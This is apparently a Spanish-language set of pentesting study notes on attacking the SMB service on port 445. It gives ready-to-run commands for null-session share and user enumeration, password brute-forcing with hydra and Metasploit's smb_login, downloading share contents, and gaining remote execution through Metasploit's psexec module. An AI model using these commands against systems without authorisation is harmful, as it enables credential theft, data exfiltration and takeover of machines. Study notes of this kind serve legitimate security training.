
El protocolo SMB del puerto 445 es de Windows y sirve para compartir recursos compartidos por la red.
Para enumerar este protocolo podemos usar las siguientes herramientas:
## ENUMERAR SMB
### RECURSOS COMPARTIDOS
- Enumerar recursos compartidos con una NullSesion (sin necesidad de credenciales) con [[SMBCLIENT]]
	`smbclient -L 192.168.1.17 -N`

- También podemos enumerar con [[ENUM4LINUX]]
	`enum4linux -a <IP_Victima>`

- También con [[SMBMAP]]
	`smbmap -H <IP_Victima>`

- También podemos usar [[CRACKMAPEXEC-NETEXEC]]
	`netexec smb <IP_Victima> -u '' -p '' --shares`

##### ACCEDER AL RECURSO COMPARTIDO
- Cuando encontramos un recurso con el que tengamos permisos, podemos acceder al recurso remoto con [[SMBCLIENT]]
	`smbclient //<IP_Victima>/<recurso> -N`


### USUARIOS
- Podemos usar  [[CRACKMAPEXEC-NETEXEC]]
	`netexec smb <IP_Victima> -u '' -p '' --users`


### FUERZA BRUTA
- Podemos probar primero a validar credenciales si las hemos obtenido usandon [[CRACKMAPEXEC-NETEXEC]]
	`netexec smb <IP_Victima> -u <User> -p <Wordlist/creds> `

- También podemos usar las credenciales encontradas con [[SMBMAP]]
	`smbmap -H <IP_VIctima> -u <User> -p <Password>`

- En caso de que sepamos un usuario pero no tengamos indicios de ninguna contraseña podemos usar ataques de fuerza bruta con [[HYDRA]] hacia el protocolo SMB
	`hydra -l <User> -P /usr/share/wordlists/rockyou.txt smb://<IP_Victima>`

### ACCESO A RECURSOS
- Una vez tenemos usuario y contraseña para iniciar sesión y listar los contenidos compartidos a nivel de red usaremos [[00. Apuntes/01. Herramientas/SMBCLIENT|SMBCLIENT]]
	`smbclient -L //<IP_Victima> -U <User>`

*PARA TRAERNOS LOS RECURSOS PODEMOS USAR `get` O SI HAY MUCHOS RECURSOS `prompt` y luego `mget *`  ****









### [[00. Apuntes/01. Herramientas/SMBMAP|SMBMAP]]
Nos sirve para saber sobre que recursos compartidos en la red tenemos permisos y en cuales no tenemos
`smbmap -H 192.168.1.17 -u 'mario' -p '123123'`

Si encontramos algún recurso compartido sobre el que podamos actuar usaremos [[00. Apuntes/01. Herramientas/SMBCLIENT|SMBCLIENT]] lo cual nos otorgara una consola en la cual podremos iniciar sesión y podremos ejecutar comandos dentro de recurso compartido
`smbclient -U 'mario' //192.168.1.17/<Nombre_recurso_compartido>`

*Si queremos visualizar archivos .txt usaremos el comando type*
### [[METASPLOIT]]

Para hacer fuerza bruta al protocolo SMB usaremos 
`use auxiliary/scanner/smb/smb_login`

Para ver las opciones de configuración usaremos
`show options`

Para configurar los parámetros usaremos
`set <Opciones> <Parametro>` 
- RPORT `445`
- RHOST `IPVictima`
- VERBOSE `false`
- SMBUSER `nombre usuario si lo conocemos`
- SMBPASS `contraseña si la conocemos`
- PASS_FILE `/usr/share/wordlists/rockyou.txt`  Diccionario en caso de no saber contraseñas

Una vez este configurado usaremos `run` para ejecutarlo
Y obtendremos la contraseña por fuerza bruta

Cuando conseguimos la contraseña del usuario intentaremos iniciar sesión con el modulo
`use exploit/windows/smb/psexec`

Una vez cargado el exploit vemos las opciones 
`show options`

Configuramos los parámetros que son necesarios
`set <Opciones> <Parametro>` 
- RPORT `445`
- RHOST `IPVictima`
- SMBUser `nombre usuario si lo conocemos`
- SMBPass `contraseña si la conocemos`

Una vez tengamos todo configurado usaremos el comando `run` para ejecutar el exploit



